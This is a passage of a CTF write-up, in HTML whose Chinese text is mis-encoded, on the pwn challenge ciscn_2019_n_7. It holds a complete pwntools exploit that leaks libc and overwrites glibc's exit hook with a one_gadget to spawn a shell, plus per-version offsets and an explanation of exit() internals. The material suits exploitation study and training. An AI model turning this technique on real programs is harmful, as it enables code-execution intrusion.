<p>åŒæ—¶ï¼Œ<strong>è¾“å…¥666åˆ™å¯ç›´æ¥æ³„éœ²libcåœ°å€</strong></p>
<p><img src="https://i.loli.net/2021/01/28/D3g5PRshQfFxVy6.png"></p>
<p><img src="https://i.loli.net/2021/01/28/hUdkKbNwqr2WZap.png"></p>
<h3 id="è§£æ³•ä¸€ï¼šåŠ«æŒexit-hook"><a href="#è§£æ³•ä¸€ï¼šåŠ«æŒexit-hook" class="headerlink" title="è§£æ³•ä¸€ï¼šåŠ«æŒexit_hook"></a>è§£æ³•ä¸€ï¼šåŠ«æŒexit_hook</h3><p>ç”±äºç¨‹åºé€€å‡ºæ—¶å¿…å®šä¼šè°ƒç”¨<code>exit()</code>å‡½æ•°ï¼Œæ•…è€ƒè™‘<strong>åŠ«æŒexit_hookä¸ºone_gadgetåé€€å‡ºç¨‹åºå³å¯get shell</strong></p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯åœ¨è®¡ç®—<code>_rtld_global</code>çš„ç›¸å¯¹åç§»æ—¶ï¼Œç”±äºlibcä¸­åŒåå‡½æ•°çš„å­˜åœ¨ï¼Œå¯¼è‡´ELF.symä¸å¯ç”¨ï¼Œæ­¤å¤„éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è°ƒè¯•ç®—å‡ºç›¸å¯¹åç§»ï¼ˆä¼¼ä¹è¿™ä¸ªç»“æ„ä½“ä¸åœ¨libcè€Œåœ¨ldä¸­ï¼Œç­‰ç¬”è€…æœ‰æ—¶é—´å†è¿›ä¸€æ­¥ç ”ç©¶ï¼‰</p>
<blockquote>
<h3 id="rtld-globalçš„åç§»â€¦"><a href="#rtld-globalçš„åç§»â€¦" class="headerlink" title="_rtld_globalçš„åç§»â€¦"></a>_rtld_globalçš„åç§»â€¦</h3><p>libc2.23ä¸‹åç§»ä¸º0x5f0040ï¼Œä¸¤ä¸ªhookçš„åç§»ä¸º3848å’Œ3850</p>
<p>libc2.27ä¸‹åç§»ä¸º0x61b060ï¼Œä¸¤ä¸ªhookçš„åç§»ä¸º3840å’Œ3848</p>
<p><strong>libc2.31ä¸‹è¯¥åŠ«æŒæ–¹æ³•å¤±æ•ˆï¼Œä½†æ˜¯å¯æ›´æ”¹ä¸ºåŠ«æŒ__elf_set___libc_atexit_element__IO_cleanup__ï¼Œåç§»ä¸º0x1ed608</strong></p>
</blockquote>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;, 26348)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;)#</span></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>((p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input string Length: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + <span class="number">0x5f0040</span>+<span class="number">3848</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New contents:&quot;</span>)</span><br><span class="line">p.send(p64(libc_base + one_gadget)*<span class="number">2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/30/kugE3iTBZFDc8xG.png"></p>
<blockquote>
<h4 id="exit-å‡½æ•°åˆ©ç”¨ç›¸å…³â€¦"><a href="#exit-å‡½æ•°åˆ©ç”¨ç›¸å…³â€¦" class="headerlink" title="exit()å‡½æ•°åˆ©ç”¨ç›¸å…³â€¦"></a>exit()å‡½æ•°åˆ©ç”¨ç›¸å…³â€¦</h4><p>ä¸€ä¸ªLinuxç¨‹åºçš„æ‰§è¡Œæµç¨‹åº”å½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://i.loli.net/2021/02/05/hZ3KjroJWDPQBcl.png"></p>
<p>è€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Note: the fini parameter is ignored here for shared library.  It</span></span><br><span class="line"><span class="comment">is registered with __cxa_atexit.  This had the disadvantage that</span></span><br><span class="line"><span class="comment">finalizers were called in more than one place.  */</span></span><br><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">		 <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">#ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params">		 ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params">		 __typeof (main) init,</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥æ®µä»£ç ä¸º<code>__libc_start_main()</code>å‡½æ•°çš„éƒ¨åˆ†ä»£ç ï¼Œè¯¥å‡½æ•°å®šä¹‰äºcsu&#x2F;libc-start.cä¸­</p>
<p>æˆ‘ä»¬ä¸éš¾ä»ä¸­çœ‹å‡ºï¼Œ<strong>å½“ä¸€ä¸ªç¨‹åºç»“æŸçš„æ—¶å€™ï¼Œéƒ½ä¼šç¼ºçœè°ƒç”¨</strong><code>exit()</code><strong>å‡½æ•°</strong></p>
<p>exit()å‡½æ•°å®šä¹‰äºstdlib&#x2F;exit.cä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">__run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure>

<p><del>ä¾æ—§æ˜¯libcä¸­å¸¸è§çš„å¥—å¨ƒå‡½æ•°</del>ï¼Œå…¶è°ƒç”¨äº†<code>__run_exit_handlers()</code>å‡½æ•°ï¼Œæˆ‘ä»¬ç»§ç»­å¯¹é½è·Ÿè¿›</p>
<p>è¯¥å‡½æ•°åŒæ ·å®šä¹‰äºstdlib&#x2F;exit.cä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">		     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (run_dtors)</span><br><span class="line">__call_tls_dtors ();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">exit (). */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span>;</span></span><br><span class="line"></span><br><span class="line">__libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">restart:</span><br><span class="line">cur = *listp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">	     atexit/on_exit registrations.  */</span></span><br><span class="line">	  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">	  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">case</span> ef_free:</span><br><span class="line">	    <span class="keyword">case</span> ef_us:</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_on:</span><br><span class="line">	      onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_at:</span><br><span class="line">	      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      atfct ();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">		 we must mark this function as ef_free.  */</span></span><br><span class="line">	      f-&gt;flavor = ef_free;</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="comment">/* Re-lock again before looking at global state.  */</span></span><br><span class="line">	  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">	    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">	       more exit functions.  Start the loop over.  */</span></span><br><span class="line">	    <span class="keyword">goto</span> restart;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">*listp = cur-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	<span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">	   allocate element.  */</span></span><br><span class="line">	<span class="built_in">free</span> (cur);</span><br><span class="line"></span><br><span class="line">__libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">_exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°ç»è¿‡ä¸€ç³»åˆ—çš„å¤„ç†ä¹‹åæœ€ç»ˆä¼šè°ƒç”¨<code>_exit()</code>å‡½æ•°ï¼Œ<strong>é€šè¿‡ç³»ç»Ÿè°ƒç”¨exitç»“æŸè¿›ç¨‹çš„ç”Ÿå‘½</strong></p>
<p>è§‚å¯Ÿåˆ°äºè¯¥å‡½æ•°ä¸­æœ‰ä¸‰ä¸ªå‡½æ•°æŒ‡é’ˆï¼š<code>atfct</code>ã€<code>onfct</code>ã€<code>cxafct</code>ï¼Œåˆ†åˆ«ä¼šæ ¹æ®listpï¼ˆä¸Šå±‚å‡½æ•°ä¼ å‚é™æ€æŒ‡é’ˆ<code>__exit_funcs</code>ï¼ŒæŒ‡å‘<code>exit_function_list</code>ç±»å‹ç»“æ„ä½“é™æ€å˜é‡<code>initial</code>ï¼Œexit_function_listç»“æ„ä½“ä¸­æœ‰ç€32ä¸ª<code>exit_function</code>ç»“æ„ä½“å˜é‡ï¼Œè¯¥ç±»å‹ç»“æ„ä½“ä½¿ç”¨è”åˆä½“çš„æ–¹å¼å‚¨å­˜ä¸‰ç§å‡½æ•°æŒ‡é’ˆï¼Œè¿›ç¨‹ä¸­çš„æ‰€æœ‰exit_function_listé“¾æ¥æˆä¸€å•å‘é“¾è¡¨ï¼‰ä¸­ä¸åŒçš„exit_functionçš„flavorçš„ä¸åŒå€¼è°ƒç”¨ä¸åŒçš„å‡½æ•°æŒ‡é’ˆ</p>
<p>ä½¿ç”¨gdbè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å…¶è°ƒç”¨çš„å…¶ä¸­ä¸€ä¸ªå‡½æ•°ä¸º<code>_dl_fini()</code></p>
<p><img src="https://i.loli.net/2021/01/30/4bsPKuojYZ2pgdJ.png"></p>
<p>è¯¥å‡½æ•°å®šä¹‰äºelf&#x2F;dl-fini.cä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹éƒ¨åˆ†ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">...</span><br><span class="line">	  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œç”¨åˆ°äº†ä¸¤ä¸ªå®<code>__rtld_lock_lock_recursive</code>å’Œ<code>__rtld_lock_unlock_recursive</code>ï¼Œå…¶å®šä¹‰äºsysdeps&#x2F;nptl&#x2F;libc-lockP.hä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">...</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªå®<code>GL()</code>ï¼Œè¯¥å®å®šä¹‰äºsysdeps&#x2F;generic&#x2F;ldsodefs.hä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EXTERN extern</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _##name</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EXTERN</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>åœ¨define SHAREDä¹‹åæœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼š<code>_rtld_local</code>ä¸<code>_rtld_global</code>ï¼Œè¿™é‡Œæˆ‘ä»¬æš‚ä¸”ä¸æ·±ç©¶ç»†èŠ‚ï¼Œä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•æˆ‘ä»¬å¯ä»¥å‘ç°å¯¹äºä¸»çº¿ç¨‹è€Œè¨€<code>_rtld_local</code>å°±æ˜¯<code>_rtld_global</code></p>
<p><img src="https://i.loli.net/2021/01/30/FNZdJ3upS2hoV6y.png"></p>
<p>æœ€ç»ˆæˆ‘ä»¬è¿›è¡Œå®å±•å¼€å¯å¾—å¦‚ä¸‹ç»“æœï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_rtld_global._dl_rtld_lock_recursive(&amp;(_rtld_global._dl_load_lock).mutex)</span><br><span class="line">_rtld_global._dl_rtld_unlock_recursive(&amp;(_rtld_global._dl_load_lock).mutex)</span><br></pre></td></tr></table></figure>

<p>å³åœ¨è¿™é‡Œ<strong>ä¼šè°ƒç”¨_rtld_globalç»“æ„ä½“ä¸­çš„ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆ_dl_rtld_lock_recursiveä¸_dl_rtld_unlock_recursiveï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€å¸¸è¯´çš„exit hook</strong></p>
<p>ä½¿ç”¨gdbè°ƒè¯•æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºå…¶ç›¸å¯¹äºlibcåŸºå€çš„åç§»ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™</p>
<p><img src="https://i.loli.net/2021/01/30/1JwrXI6u3ckPzHl.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨glibc2.31åŠä»¥åçš„ç‰ˆæœ¬ä¸­<strong>exitå‡½æ•°ä¸ä¼šå†è°ƒç”¨_dl_finiå‡½æ•°ï¼Œå¯¹äºè¯¥ä¸ªexit hookçš„åˆ©ç”¨å¤±æ•ˆ</strong></p>
<h4 id="libc-2-31ä¸‹çš„-exit-hook"><a href="#libc-2-31ä¸‹çš„-exit-hook" class="headerlink" title="libc 2.31ä¸‹çš„ exit hook"></a>libc 2.31ä¸‹çš„ exit hook</h4><p>ä¼—æ‰€å‘¨çŸ¥ï¼ˆxï¼‰ï¼Œåœ¨exitå‡½æ•°æ‰§è¡Œæµç¨‹ä¸­ä¼šè°ƒç”¨<code>_IO_cleanup()</code>å‡½æ•° </p>
<p><img src="https://i.loli.net/2021/02/18/bLzchNjVJw9Qs6S.png" alt="image.png"></p>
<p>å…¶ä¸Šå±‚è°ƒç”¨å‡½æ•°ä¸º<code>__run_exit_handlers()</code>ï¼Œ<strong>è¿™ä¸ªå‡½æ•°ä¼šæ‰§è¡Œä¸€ç³»åˆ—çš„å‡½æ•°æŒ‡é’ˆ</strong>ï¼Œå…¶ä¸­å°±åŒ…æ‹¬<code>_IO_cleanup()</code></p>
<p>å› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨å‚¨å­˜<code>_IO_cleanup()</code>æŒ‡é’ˆçš„ä½ç½®è¦†å†™ä¸Šæˆ‘ä»¬çš„backdoorå‡½æ•°åœ°å€å³å¯get shell</p>
<p>gdbè°ƒè¯•ï¼Œè§‚å¯Ÿåˆ°è¿™æ ·ä¸€ä¸ªä¸œè¥¿<code>__elf_set___libc_atexit_element__IO_cleanup__</code>ï¼Œ<strong>é‡Œé¢å‚¨å­˜ç€_IO_cleanup</strong>å‡½æ•°çš„åœ°å€</p>
<p><img src="https://i.loli.net/2021/02/18/QpfhuWgjX5wPGdF.png" alt="image.png"></p>
<p><strong>ç»è¿‡è°ƒè¯•</strong>æˆ‘ä»¬ä¸éš¾å¾—çŸ¥è¿™ä¾¿æ˜¯ç±»ä¼¼ ã€Œexit hookã€ä¸€æ ·çš„ä¸œè¥¿ï¼Œ<code>__run_exit_handlers()</code>å‡½<strong>æ•°ä¼šæ‰§è¡Œå…¶ä¸Šçš„å‡½æ•°æŒ‡é’ˆ</strong>ï¼Œé‚£ä¹ˆåªéœ€è¦å¾€ä¸Šå†™backdooråœ°å€ï¼ˆå¦‚one_gadgetç­‰ï¼‰å³å¯get shell</p>
</blockquote>
<blockquote>
<p>æ³¨æ„åˆ°exit()å‡½æ•°ä¸­è¿˜è°ƒç”¨äº†<code> _IO_flush_all_lockp ()</code>å‡½æ•°ï¼Œè¿™<strong>ä¸ºæˆ‘ä»¬æä¾›äº†å¦ä¸€ç§åˆ©ç”¨exitå‡½æ•°get shellçš„è§£æ³•â€”â€”FSOP</strong></p>
</blockquote>
